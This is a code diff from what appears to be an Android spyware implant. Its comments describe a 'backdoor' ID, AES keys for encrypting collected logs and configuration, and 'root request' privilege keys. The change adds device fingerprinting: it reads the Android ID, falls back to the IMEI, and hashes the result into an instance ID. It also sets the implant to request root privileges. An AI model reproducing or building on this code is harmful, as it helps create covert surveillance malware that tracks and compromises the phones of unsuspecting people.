@@ -9,14 +9,50 @@
 
 package com.android.networking.crypto;
 
+import android.content.Context;
+import android.provider.Settings.Secure;
+import android.telephony.TelephonyManager;
+
+import com.android.networking.Device;
+import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
+import com.android.networking.interfaces.iKeys;
 import com.android.networking.util.Check;
 import com.android.networking.util.Utils;
 
 /**
  * The Class KeysFake.
  */
-public class KeysFake extends Keys {
+public class KeysFake implements iKeys {
+	// 20 bytes that uniquely identifies the device (non-static on purpose)
+	/** The g_ instance id. */
+	private static byte[] instanceId;
+
+	// 16 bytes that uniquely identifies the backdoor, NULL-terminated
+	/** The Constant g_BackdoorID. */
+	private static byte[] backdoorId;
+
+	// AES key used to encrypt logs
+	/** The Constant g_AesKey. */
+	private static byte[] aesKey;
+
+	// AES key used to decrypt configuration
+	/** The Constant g_ConfKey. */
+	private static byte[] confKey;
+
+	// Challenge key
+	/** The Constant g_Challenge. */
+	private static byte[] challengeKey;
+
+	// Demo key
+	private static byte[] demoMode;
+
+	// Privilege key
+	private static byte[] rootRequest;
+	
+	// Random seed
+	private static byte[] randomSeed;
+	
 	private static final String TAG = "KeysFake";
 	
 	// RCS 816 "Test8" su castore
@@ -43,12 +79,29 @@ public class KeysFake extends Keys {
 	// Don't get root
 	//byte[] RootRequest = "IrXCtyrrDXMJEvOUbs".getBytes();
 
-	public KeysFake() {
-		super(false);
-		
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (KeysFake) wants privilege: " + wantsPrivilege());
+	protected KeysFake() {
+
+		String androidId = Secure.getString(Status.getAppContext().getContentResolver(), Secure.ANDROID_ID);
+		if (androidId == null) {
+			androidId = "EMPTY";
 		}
+
+		//20.0=9774d56d682e549c Messages.getString("20.0")
+		if ("9774d56d682e549c".equals(androidId) && !Device.self().isSimulator()) { //$NON-NLS-1$
+			// http://code.google.com/p/android/issues/detail?id=10603
+			// http://stackoverflow.com/questions/2785485/is-there-a-unique-android-device-id
+			final TelephonyManager telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(
+					Context.TELEPHONY_SERVICE);
+
+			final String imei = telephonyManager.getDeviceId();
+			androidId = imei;
+		}
+
+		if (Cfg.DEBUGKEYS) {
+			Check.log(TAG + " (Keys), androidId: " + androidId);
+		}
+
+		instanceId = Digest.SHA1(androidId.getBytes());
 	}
 
 	protected byte[] getRootRequest() {
@@ -98,4 +151,25 @@ public class KeysFake extends Keys {
 	public byte[] getBuildId() {
 		return BuildId.getBytes();
 	}
+
+	@Override
+	public boolean hasBeenBinaryPatched() {		
+		return true;
+	}
+
+	@Override
+	public boolean wantsPrivilege() {
+		return true;
+	}
+
+	@Override
+	/**
+	 * Gets the instance id.
+	 * 
+	 * @return the instance id
+	 */
+	public byte[] getInstanceId() {
+		return instanceId;
+	}
+
 }
